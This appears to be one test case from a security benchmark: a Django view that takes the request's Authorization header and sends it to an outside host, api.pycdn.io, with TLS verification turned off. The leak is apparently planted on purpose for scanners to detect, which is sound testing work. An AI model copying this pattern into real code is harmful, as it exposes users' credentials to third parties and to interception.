# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests


def to_text(value):
    return str(value).strip()

def BenchmarkTest33230(request):
    auth_header = request.META.get('HTTP_AUTHORIZATION', '')
    data = to_text(auth_header)
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=False)
    return JsonResponse({"saved": True})
